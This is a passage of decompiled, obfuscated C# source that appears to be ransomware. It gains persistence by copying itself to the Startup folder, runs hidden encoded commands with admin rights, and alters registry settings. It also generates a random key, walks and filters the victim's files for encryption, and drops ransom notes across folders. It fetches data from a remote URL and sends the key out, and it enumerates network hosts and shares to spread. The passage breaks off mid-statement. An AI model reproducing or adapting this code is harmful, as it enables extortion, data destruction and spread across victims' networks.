	public static bool dTyBwXiyZmm;

	public static bool brAfHWSzDbgM;

	public static bool tulEWCZoBjriFo;

	public static bool MjeZXFRTbmVvWAYY;

	public static string CaiUUOOprZSOI;

	public static bool CWJvOLeqgyddlcWAG;

	public static bool sKXLpqJtDm;

	public static bool KZguPWiaCOq;

	public static bool kTvNgjuGRAjhCBkP;

	public static bool IiEkQrvmRIR;

	public static string UpWeGYvBeGdKKPF;

	public static List<string> aODoRHZYWeVax;

	public static List<string> AnAXKtORlBOx;

	public static List<string> AuviPSoWvgcSRp;

	private static ThreadStart CS_0024_003C_003E9__CachedAnonymousMethodDelegatee;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate11;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate12;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate13;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate14;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate15;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate16;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate17;

	[NonSerialized]
	internal static GetString getString_0;

	private static void Main(string[] args)
	{
		try
		{
			qzrskuRwcqM CS_0024_003C_003E8__locals0 = new qzrskuRwcqM();
			CS_0024_003C_003E8__locals0.bKuqRAwKslJi = Process.GetCurrentProcess().ProcessName;
			if (Process.GetProcesses().Count((Process process_0) => process_0.ProcessName == CS_0024_003C_003E8__locals0.bKuqRAwKslJi) > 1)
			{
				return;
			}
		}
		catch (Exception)
		{
		}
		try
		{
			edvTExRsAaWy.UPSUGCEzFP(doRadQRQDdrKKc);
		}
		catch (Exception)
		{
		}
		try
		{
			if (GsbPUlfjszh == getString_0(107396787))
			{
				Thread thread = new Thread(XUJZwHwRaPXMd.xLbrWVTcCjdxSr);
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
		}
		catch
		{
		}
		if (hMsIWlRzYTbzz == getString_0(107396787))
		{
			Thread.Sleep(int.Parse(gIIaFOGxgjhbOPbd));
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && qDjgFderneJ == getString_0(107396787))
		{
			try
			{
				HbCbQopCcqEp(sZXTHnjVRHJHh(getString_0(107396782)));
			}
			catch
			{
			}
		}
		if (eStZUoAxoq == getString_0(107396787))
		{
			NpTTnDuHpFRBrnNY.XxBcCowaKmU();
		}
		try
		{
			if (hsEzAQuJXtzCY == getString_0(107396787) && GEqFXOzlJuN.rceyhqqMCK())
			{
				new hJOuphokktBFxHG().zpuVZwdEdgd(bool_0: false);
				GEqFXOzlJuN.EfFhMVTwDDEl();
			}
		}
		catch (Exception)
		{
		}
		if (aNkRJHChYmlmHoVd == getString_0(107396787) && GEqFXOzlJuN.rceyhqqMCK())
		{
			new hJOuphokktBFxHG().zpuVZwdEdgd(bool_0: false);
			new hJOuphokktBFxHG().jGgKhVFnpXmD();
		}
		if (wCHkzTdtpItw == getString_0(107396787))
		{
			qwThLWBAEenBF.ZeXboIvYQw();
		}
		try
		{
			ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
			string fileName = mainModule.FileName;
			string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + getString_0(107397221);
			string text2 = text + Path.GetFileName(fileName);
			if (UciAonDnDgG == getString_0(107396787) && fileName != text2)
			{
				Thread thread2 = new Thread(AKDcLsknKDDs);
				thread2.IsBackground = true;
				thread2.Priority = ThreadPriority.Normal;
				thread2.Start();
			}
			if (qlrIuPADfJmNXN == getString_0(107396787) && mainModule != null && fileName != text2)
			{
				try
				{
					uuEPphXmHlJGCzJ = SmJgJiDQjiDn(0, KUEQBNlZlAJotIdmaQ.Count);
					File.Copy(fileName, text + KUEQBNlZlAJotIdmaQ[uuEPphXmHlJGCzJ], overwrite: true);
					Process.Start(text + KUEQBNlZlAJotIdmaQ[uuEPphXmHlJGCzJ]);
					vNWFGBoTjkX();
					Process.GetCurrentProcess().Kill();
				}
				catch (Exception)
				{
				}
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (afLnwsGiSBdAJD == getString_0(107396787) && DateTime.Now < gmtRJswlljT)
			{
				return;
			}
		}
		catch
		{
		}
		try
		{
			if (XHjSzuVQnUlIK == getString_0(107396787) && DateTime.Now > kukYFEXFwiSYkT)
			{
				vNWFGBoTjkX();
			}
		}
		catch
		{
		}
		KUYPzuHTWukLY();
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatee == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegatee = delegate
			{
				List<string> source = rTdBGDqcIJimSxIX;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
					{
						tNIQYAGwSjGxNLsorK(getString_0(107389959), string_0);
					};
				}
				Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
				List<string> keEYwzsaSxlMyF = KeEYwzsaSxlMyF;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
					{
						tNIQYAGwSjGxNLsorK(getString_0(107393039), string_0);
					};
				}
				Parallel.ForEach(keEYwzsaSxlMyF, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
				List<string> mSUPRnrxQZS = MSUPRnrxQZS;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 = delegate(string string_0)
					{
						tNIQYAGwSjGxNLsorK(sZXTHnjVRHJHh(getString_0(107389950)), string_0);
					};
				}
				Parallel.ForEach(mSUPRnrxQZS, CS_0024_003C_003E9__CachedAnonymousMethodDelegate13);
				if (NeuNfTmbHfaft == getString_0(107396787))
				{
					string[] msFMIZIkwWWDM = MsFMIZIkwWWDM;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 = delegate(string string_0)
						{
							tNIQYAGwSjGxNLsorK(sZXTHnjVRHJHh(getString_0(107389950)), getString_0(107389925) + string_0 + getString_0(107389916));
						};
					}
					Parallel.ForEach(msFMIZIkwWWDM, CS_0024_003C_003E9__CachedAnonymousMethodDelegate14);
				}
				if (!joaHINJofMtf().Contains(getString_0(107389627)))
				{
					wdbDsjzTMTZdknmj(IquwDHMWXJfl);
				}
				else
				{
					List<string> aaZWCpttHpB = AaZWCpttHpB;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 = delegate(string string_0)
						{
							tNIQYAGwSjGxNLsorK(sZXTHnjVRHJHh(GWbGalFEHz(getString_0(107389879))), string_0);
						};
					}
					Parallel.ForEach(aaZWCpttHpB, CS_0024_003C_003E9__CachedAnonymousMethodDelegate15);
				}
				List<string> source2 = vtEaPMjBqiI;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 = delegate(string string_0)
					{
						tNIQYAGwSjGxNLsorK(sZXTHnjVRHJHh(getString_0(107389886)), string_0);
					};
				}
				Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate16);
				List<string> source3 = fguLtySThkLVUO;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate17 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate17 = delegate(string string_0)
					{
						tNIQYAGwSjGxNLsorK(getString_0(107389837), string_0);
					};
				}
				Parallel.ForEach(source3, CS_0024_003C_003E9__CachedAnonymousMethodDelegate17);
			};
		}
		Thread thread3 = new Thread(CS_0024_003C_003E9__CachedAnonymousMethodDelegatee);
		thread3.Priority = ThreadPriority.Normal;
		thread3.IsBackground = true;
		thread3.Start();
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && tulEWCZoBjriFo)
			{
				try
				{
					Thread thread4 = new Thread(tbRFZlCAIcg.VMhIRHZEdd);
					thread4.IsBackground = true;
					thread4.Start();
				}
				catch
				{
				}
			}
		}
		catch (Exception)
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			tNIQYAGwSjGxNLsorK(getString_0(107397216), sZXTHnjVRHJHh(getString_0(107397171)));
			tNIQYAGwSjGxNLsorK(getString_0(107397216), sZXTHnjVRHJHh(getString_0(107397098)));
			tNIQYAGwSjGxNLsorK(sZXTHnjVRHJHh(getString_0(107397041)), sZXTHnjVRHJHh(getString_0(107397060)));
			tNIQYAGwSjGxNLsorK(sZXTHnjVRHJHh(getString_0(107397041)), sZXTHnjVRHJHh(getString_0(107396418)));
		}
		if (QeXXVVSolOUXg == getString_0(107396787) && tsaCzkUrwgAcbqs() && new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			Thread thread5 = new Thread(pPSzUAdsao.mtbMcnjbjgRz);
			thread5.IsBackground = true;
			thread5.Priority = ThreadPriority.Normal;
			thread5.Start();
		}
		_ = EpNlyaldrfMUUp == getString_0(107396787);
		SecureString secureString = new SecureString();
		if (yqYtbZXdPjhAbt == getString_0(107396244))
		{
			Random random = new Random();
			for (int i = 0; i < 32; i++)
			{
				char value = (char)(random.Next(33, 127) % 255);
				if (Convert.ToInt32(value) != 34 && Convert.ToInt32(value) != 92)
				{
					secureString.AppendChar(Convert.ToChar(value));
				}
				else
				{
					i--;
				}
			}
		}
		else
		{
			aldVhKQaAlMhN = getString_0(107396239);
		}
		VuGCfwhZpvjG = KFckqrNJGkCunhP.SqbbFIeFDghCLc(ZIfBSJmobgaGiR(secureString));
		if (KZguPWiaCOq)
		{
			try
			{
				if (!File.Exists(Path.Combine(Directory.GetCurrentDirectory(), UpWeGYvBeGdKKPF)))
				{
					File.WriteAllText(Path.Combine(Directory.GetCurrentDirectory(), UpWeGYvBeGdKKPF), string.Concat(sZXTHnjVRHJHh(getString_0(107396226)), new WebClient().DownloadString(sZXTHnjVRHJHh(getString_0(107396681))), getString_0(107396672), sZXTHnjVRHJHh(getString_0(107396667)), DateTime.Now, getString_0(107396672), sZXTHnjVRHJHh(getString_0(107396594)), VuGCfwhZpvjG));
				}
				else
				{
					File.AppendAllText(Path.Combine(Directory.GetCurrentDirectory(), UpWeGYvBeGdKKPF), getString_0(107396569) + VuGCfwhZpvjG);
				}
			}
			catch (Exception ex7)
			{
				if (CWJvOLeqgyddlcWAG)
				{
					try
					{
						File.AppendAllText(CaiUUOOprZSOI, getString_0(107396540) + ex7.Message + getString_0(107396672));
					}
					catch (Exception)
					{
					}
				}
			}
		}
		gzHrEevdICapb.BCBpHyoERcoy(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), erFyhehuVCTLSQ), VBvOSUjcFgZq(VuGCfwhZpvjG), null, null, getString_0(107396459), getString_0(107396474), null);
		if (bFsJUnRDcjikGdM == getString_0(107396787))
		{
			try
			{
				RiZLPWOJFWYtZH();
			}
			catch
			{
			}
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			XzKzaBmetL();
		}
		try
		{
			cbHMsnrHiiZrBk(new string[1] { getString_0(107395913) }, new string[100]
			{
				getString_0(107395936),
				getString_0(107395931),
				getString_0(107395894),
				getString_0(107395885),
				getString_0(107395912),
				getString_0(107395907),
				getString_0(107395902),
				getString_0(107395897),
				getString_0(107395860),
				getString_0(107395855),
				getString_0(107395850),
				getString_0(107395877),
				getString_0(107395868),
				getString_0(107395831),
				getString_0(107395822),
				getString_0(107395817),
				getString_0(107395844),
				getString_0(107395839),
				getString_0(107395834),
				getString_0(107395797),
				getString_0(107395788),
				getString_0(107395815),
				getString_0(107395810),
				getString_0(107395805),
				getString_0(107395768),
				getString_0(107395763),
				getString_0(107395758),
				getString_0(107395753),
				getString_0(107395780),
				getString_0(107395775),
				getString_0(107395770),
				getString_0(107395733),
				getString_0(107395728),
				getString_0(107395723),
				getString_0(107395746),
				getString_0(107395741),
				getString_0(107395704),
				getString_0(107395699),
				getString_0(107395902),
				getString_0(107395694),
				getString_0(107395860),
				getString_0(107395717),
				getString_0(107395712),
				getString_0(107395707),
				getString_0(107396182),
				getString_0(107396177),
				getString_0(107396172),
				getString_0(107396199),
				getString_0(107396194),
				getString_0(107396189),
				getString_0(107396152),
				getString_0(107396147),
				getString_0(107396142),
				getString_0(107396137),
				getString_0(107396164),
				getString_0(107396159),
				getString_0(107396154),
				getString_0(107396117),
				getString_0(107396108),
				getString_0(107396135),
				getString_0(107396126),
				getString_0(107396081),
				getString_0(107395694),
				getString_0(107396100),
				getString_0(107396091),
				getString_0(107396050),
				getString_0(107396041),
				getString_0(107396064),
				getString_0(107396023),
				getString_0(107396018),
				getString_0(107396009),
				getString_0(107396032),
				getString_0(107395991),
				getString_0(107395986),
				getString_0(107395981),
				getString_0(107396008),
				getString_0(107396003),
				getString_0(107395998),
				getString_0(107395993),
				getString_0(107395952),
				getString_0(107395947),
				getString_0(107395974),
				getString_0(107395969),
				getString_0(107395964),
				getString_0(107395415),
				getString_0(107395406),
				getString_0(107395429),
				getString_0(107395424),
				getString_0(107395728),
				getString_0(107395419),
				getString_0(107395382),
				getString_0(107395377),
				getString_0(107395372),
				getString_0(107395399),
				getString_0(107395390),
				getString_0(107395385),
				getString_0(107395348),
				getString_0(107395339),
				getString_0(107395366),
				getString_0(107395361)
			}, new string[0], ZIfBSJmobgaGiR(secureString), getString_0(107395356));
		}
		catch (Exception ex9)
		{
			if (CWJvOLeqgyddlcWAG)
			{
				try
				{
					File.AppendAllText(CaiUUOOprZSOI, getString_0(107395311) + ex9.Message);
				}
				catch (Exception)
				{
				}
			}
			try
			{
				secureString.Dispose();
			}
			catch
			{
			}
		}
		try
		{
			secureString.Dispose();
		}
		catch
		{
		}
		try
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395286)))
			{
				using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395286));
				streamWriter.WriteLine(sZXTHnjVRHJHh(getString_0(107395253)));
				streamWriter.WriteLine(getString_0(107396672));
				streamWriter.WriteLine(sZXTHnjVRHJHh(getString_0(107393811)));
				streamWriter.WriteLine(VuGCfwhZpvjG);
				if (JVeOnCXrBINQO == getString_0(107396244))
				{
					streamWriter.WriteLine(getString_0(107396672));
					streamWriter.WriteLine(sZXTHnjVRHJHh(getString_0(107393778)) + Convert.ToString(yDDNFePBurFmPAas.Count));
				}
			}
			else
			{
				File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395286), getString_0(107393733) + VuGCfwhZpvjG);
			}
		}
		catch
		{
		}
		int num = 0;
		foreach (string item in EmJIhpwRkVaJOMp)
		{
			num++;
			try
			{
				if (item == Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
				{
					continue;
				}
			}
			catch
			{
			}
			try
			{
				if (!File.Exists(item + getString_0(107395286)))
				{
					File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395286), item + getString_0(107395286), overwrite: true);
				}
				else
				{
					File.AppendAllText(item + getString_0(107395286), getString_0(107393733) + VuGCfwhZpvjG);
				}
			}
			catch (Exception)
			{
			}
			if (!MjeZXFRTbmVvWAYY && num > 10)
			{
				break;
			}
		}
		if (sSHYSlCKpuHjC == getString_0(107396787))
		{
			try
			{
				if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107393704)))
				{
					using StreamWriter streamWriter2 = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107393704));
					streamWriter2.WriteLine(sZXTHnjVRHJHh(getString_0(107393671)));
					streamWriter2.WriteLine(getString_0(107396672));
					streamWriter2.WriteLine(sZXTHnjVRHJHh(getString_0(107394134)));
					streamWriter2.WriteLine(VuGCfwhZpvjG + sZXTHnjVRHJHh(getString_0(107394077)));
					if (JVeOnCXrBINQO == getString_0(107396244))
					{
						streamWriter2.WriteLine(getString_0(107396672));
						streamWriter2.WriteLine(sZXTHnjVRHJHh(getString_0(107394032)) + sZXTHnjVRHJHh(getString_0(107393778)) + Convert.ToString(yDDNFePBurFmPAas.Count) + sZXTHnjVRHJHh(getString_0(107394077)));
					}
				}
				else
				{
					File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107393704), sZXTHnjVRHJHh(getString_0(107394032)) + getString_0(107393733) + VuGCfwhZpvjG + sZXTHnjVRHJHh(getString_0(107394077)));
				}
			}
			catch
			{
			}
		}
		if (GcWglZgKFxR == getString_0(107396787))
		{
			try
			{
				if (JVeOnCXrBINQO == getString_0(107396244))
				{
					fSyEEKEvmFT.kSTebJdbUq(getString_0(107393971), getString_0(107393966), getString_0(107393985), string.Concat(sZXTHnjVRHJHh(getString_0(107396226)), new WebClient().DownloadString(sZXTHnjVRHJHh(getString_0(107396681))), getString_0(107393944), sZXTHnjVRHJHh(getString_0(107396667)), DateTime.Now, getString_0(107396672), sZXTHnjVRHJHh(getString_0(107393939)), Convert.ToString(yDDNFePBurFmPAas.Count), getString_0(107396672), sZXTHnjVRHJHh(getString_0(107396594)), VuGCfwhZpvjG));
				}
				else
				{
					fSyEEKEvmFT.kSTebJdbUq(getString_0(107393971), getString_0(107393966), getString_0(107393985), string.Concat(sZXTHnjVRHJHh(getString_0(107396226)), new WebClient().DownloadString(sZXTHnjVRHJHh(getString_0(107396681))), getString_0(107393944), sZXTHnjVRHJHh(getString_0(107396667)), DateTime.Now, getString_0(107396672), sZXTHnjVRHJHh(getString_0(107393939)), Convert.ToString(yDDNFePBurFmPAas.Count), getString_0(107396672), sZXTHnjVRHJHh(getString_0(107396594)), VuGCfwhZpvjG));
				}
			}
			catch
			{
			}
		}
		if (lITzVnlWBJ == getString_0(107396787))
		{
			try
			{
				XOrIqQdZNwxk.qTTeDEjZBMeb(new Uri(getString_0(107393922)));
			}
			catch
			{
			}
		}
		if (sSHYSlCKpuHjC == getString_0(107396244))
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395286)))
				{
					Process.Start(sZXTHnjVRHJHh(getString_0(107393921)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395286));
				}
			}
			catch
			{
			}
		}
		else
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107393704)))
				{
					Process.Start(sZXTHnjVRHJHh(getString_0(107393384)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107393704));
				}
			}
			catch
			{
			}
		}
		if (!string.IsNullOrEmpty(AFQqTJKxHbunh))
		{
			try
			{
				File.Delete(AFQqTJKxHbunh);
			}
			catch
			{
			}
		}
		if (CWJvOLeqgyddlcWAG)
		{
			try
			{
				File.AppendAllText(CaiUUOOprZSOI, getString_0(107393335));
			}
			catch (Exception)
			{
			}
		}
		if (pjbuqjEcISLbaVHe == getString_0(107393322))
		{
			vNWFGBoTjkX();
		}
	}

	public static void AKDcLsknKDDs()
	{
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(sZXTHnjVRHJHh(getString_0(107393345)), sZXTHnjVRHJHh(getString_0(107393191)), (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	private static int SmJgJiDQjiDn(int int_0, int int_1)
	{
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[4];
		rNGCryptoServiceProvider.GetBytes(array);
		int seed = BitConverter.ToInt32(array, 0);
		return new Random(seed).Next(int_0, int_1);
	}

	public static List<string> MpmnMNaZWYuJUDG(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		Stack<string> stack = new Stack<string>(20);
		stack.Push(string_0);
		while (stack.Count > 0)
		{
			string text = stack.Pop();
			string[] directories;
			try
			{
				directories = Directory.GetDirectories(text);
			}
			catch
			{
				continue;
			}
			string[] array = null;
			try
			{
				if (!text.ToLower().Contains(getString_0(107393142)) && !text.ToLower().Contains(getString_0(107393153)) && !text.ToLower().Contains(getString_0(107393620)) && !text.ToLower().Contains(getString_0(107393639)) && !text.ToLower().Contains(getString_0(107393582)) && !text.ToLower().Contains(getString_0(107393593)) && !text.ToLower().Contains(getString_0(107393548)) && !text.ToLower().Contains(getString_0(107393567)) && !text.ToLower().Contains(getString_0(107393530)) && !text.ToLower().Contains(getString_0(107393489)) && !text.ToLower().Contains(getString_0(107393504)) && !text.ToLower().Contains(getString_0(107393593)) && !text.ToLower().Contains(getString_0(107393459)) && !text.ToLower().Contains(getString_0(107393470)))
				{
					array = Directory.GetFiles(text);
					goto IL_01eb;
				}
			}
			catch
			{
			}
			continue;
			IL_01eb:
			string[] array2 = array;
			foreach (string fileName in array2)
			{
				try
				{
					FileInfo fileInfo = new FileInfo(fileName);
					if (!fileInfo.FullName.Contains(getString_0(107393445)) && !fileInfo.FullName.Contains(getString_0(107393396)) && !fileInfo.FullName.Contains(getString_0(107393411)) && !fileInfo.FullName.Contains(getString_0(107392850)) && !fileInfo.FullName.Contains(getString_0(107392865)) && !fileInfo.FullName.Contains(getString_0(107392816)) && !fileInfo.FullName.Contains(getString_0(107392831)) && !fileInfo.FullName.Contains(getString_0(107392782)) && !fileInfo.FullName.Contains(getString_0(107392801)) && !fileInfo.FullName.Contains(getString_0(107392748)) && !fileInfo.FullName.ToLower().Contains(getString_0(107392767)) && !fileInfo.FullName.ToLower().Contains(getString_0(107392722)) && !fileInfo.FullName.ToLower().Contains(getString_0(107392737)) && !fileInfo.FullName.ToLower().Contains(getString_0(107392688)) && !fileInfo.FullName.Contains(sZXTHnjVRHJHh(getString_0(107392703))) && !fileInfo.FullName.Contains(getString_0(107392678)) && !fileInfo.FullName.Contains(getString_0(107392665)) && !fileInfo.FullName.EndsWith(getString_0(107395356)) && !fileInfo.FullName.EndsWith(getString_0(107392640)) && !fileInfo.FullName.EndsWith(getString_0(107392635)) && !fileInfo.FullName.EndsWith(getString_0(107393110)) && !fileInfo.FullName.EndsWith(getString_0(107393105)) && !fileInfo.FullName.Contains(getString_0(107393100)) && !fileInfo.FullName.Contains(erFyhehuVCTLSQ) && !fileInfo.FullName.Contains(CaiUUOOprZSOI) && !fileInfo.FullName.Contains(UpWeGYvBeGdKKPF))
					{
						if (File.Exists(fileInfo.FullName) && (double)fileInfo.Length <= double.Parse(LIIoXHybcY) * 1024.0 * 1024.0 && DcddTdPcfuJ == getString_0(107396787))
						{
							list.Add(fileInfo.FullName);
							TjIOQNxtKtnhMPtdZ(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
						else if (File.Exists(fileInfo.FullName) && DcddTdPcfuJ == getString_0(107396244))
						{
							list.Add(fileInfo.FullName);
							TjIOQNxtKtnhMPtdZ(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
					}
				}
				catch
				{
				}
			}
			string[] array3 = directories;
			foreach (string item in array3)
			{
				stack.Push(item);
			}
		}
		return list;
	}

	public static string tNIQYAGwSjGxNLsorK(string ibDiPFcSizY = "", string YxQxCiTnXiU = "")
	{
		string result = getString_0(107393922);
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = ibDiPFcSizY,
				Arguments = YxQxCiTnXiU,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				StandardOutputEncoding = Encoding.GetEncoding(850)
			};
			Process process2 = process;
			process2.Start();
			return result;
		}
		catch
		{
			return result;
		}
	}

	public static void HbCbQopCcqEp(string string_0)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = getString_0(107393115),
			Arguments = string_0,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	public static string GWbGalFEHz(string string_0)
	{
		char[] array = string_0.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	public static string sZXTHnjVRHJHh(string string_0)
	{
		byte[] bytes = Convert.FromBase64String(string_0);
		return Encoding.UTF8.GetString(bytes);
	}

	private static void RiZLPWOJFWYtZH()
	{
		//IL_05b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_05b8: Expected O, but got Unknown
		//IL_05d3: Unknown result type (might be due to invalid IL or missing references)
		//IL_05da: Expected O, but got Unknown
		pPSzUAdsao.FrkPIGkvhgeP();
		AuviPSoWvgcSRp = pPSzUAdsao.qMRvenqpIqrzZzRz();
		List<IoXvsfKKDqKP> list = IoXvsfKKDqKP.ZQqtZwETJef();
		foreach (IoXvsfKKDqKP item in list)
		{
			AnAXKtORlBOx.Add(item.IPAddress);
		}
		aODoRHZYWeVax = AuviPSoWvgcSRp.Union(AnAXKtORlBOx).ToList();
		foreach (string item2 in aODoRHZYWeVax)
		{
			if ((!item2.StartsWith(getString_0(107393066)) && !item2.StartsWith(getString_0(107393093)) && !item2.StartsWith(getString_0(107393084)) && !item2.StartsWith(getString_0(107393922))) || !pPSzUAdsao.ekTxsoWmOuCtv(item2))
			{
				continue;
			}
			try
			{
				if (HPbZVzfaaiUf == getString_0(107396787))
				{
					for (int i = 0; i < pPSzUAdsao.CPBqDAxLxUb.Count; i++)
					{
						tNIQYAGwSjGxNLsorK(getString_0(107393039), getString_0(107393058) + item2 + getString_0(107393049) + pPSzUAdsao.CPBqDAxLxUb[i] + getString_0(107393004) + pPSzUAdsao.SYBPLbuvdPFNErv[i]);
					}
				}
				else
				{
					tNIQYAGwSjGxNLsorK(getString_0(107393039), getString_0(107393058) + item2);
				}
			}
			catch
			{
			}
		}
		try
		{
			pPSzUAdsao.AzQGklUIXnoasLW azQGklUIXnoasLW = new pPSzUAdsao.AzQGklUIXnoasLW(pPSzUAdsao.qekwPSmDBEdO.LPPjkJrjXV, pPSzUAdsao.lmqBzoePqeXoa.ZlbNctOganCkca, pPSzUAdsao.OvHlAgWLbJNN.FMnloWmArgPE, pPSzUAdsao.UYCvXkeBmjxD.CUmlsKbyUt);
			foreach (string item3 in azQGklUIXnoasLW)
			{
				MatchCollection matchCollection = Regex.Matches(item3, getString_0(107393031));
				foreach (Match item4 in matchCollection)
				{
					try
					{
						if (HPbZVzfaaiUf == getString_0(107396787))
						{
							for (int j = 0; j < pPSzUAdsao.CPBqDAxLxUb.Count; j++)
							{
								tNIQYAGwSjGxNLsorK(getString_0(107393039), getString_0(107392918) + item4.ToString() + getString_0(107393049) + pPSzUAdsao.CPBqDAxLxUb[j] + getString_0(107393004) + pPSzUAdsao.SYBPLbuvdPFNErv[j]);
							}
						}
						else
						{
							tNIQYAGwSjGxNLsorK(getString_0(107393039), getString_0(107392918) + item4.ToString());
						}
					}
					catch
					{
					}
					if (!NHjEeCAIyKCHA.Contains(item4.ToString()))
					{
						NHjEeCAIyKCHA.Add(item4.ToString());
					}
				}
			}
		}
		catch (Exception)
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			try
			{
				string string_ = GWbGalFEHz(getString_0(107392909));
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(sZXTHnjVRHJHh(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.SetValue(sZXTHnjVRHJHh(getString_0(107392324)), 1, RegistryValueKind.DWord);
					registryKey.SetValue(sZXTHnjVRHJHh(getString_0(107392235)), 1, RegistryValueKind.DWord);
					registryKey.Close();
				}
			}
			catch
			{
			}
		}
		if (yktBbrfbKqZX == getString_0(107396787))
		{
			try
			{
				string text = Path.GetTempFileName().Replace(getString_0(107392222), getString_0(107392181));
				File.WriteAllText(text, sZXTHnjVRHJHh(getString_0(107392172)), Encoding.ASCII);
				tNIQYAGwSjGxNLsorK(getString_0(107397216), getString_0(107391086) + text);
				if (File.Exists(text))
				{
					File.Delete(text);
				}
				if (File.Exists(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), getString_0(107391081))))
				{
					File.Delete(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), getString_0(107391081)));
				}
				if (File.Exists(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), getString_0(107391104))))
				{
					File.Delete(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), getString_0(107391104)));
				}
			}
			catch
			{
			}
		}
		ManagementObjectSearcher val = new ManagementObjectSearcher(getString_0(107391575));
		ManagementObjectEnumerator enumerator5 = val.Get().GetEnumerator();
		try
		{
			while (enumerator5.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator5.get_Current();
				if (!NHjEeCAIyKCHA.Contains(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107391554), getString_0(107397221)).Replace(getString_0(107391549), getString_0(107391554))
					.Replace(getString_0(107391508), getString_0(107393922))
					.Split(new char[1] { '(' })[0].Trim()))
				{
					NHjEeCAIyKCHA.Add(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107391554), getString_0(107397221)).Replace(getString_0(107391549), getString_0(107391554))
						.Replace(getString_0(107391508), getString_0(107393922))
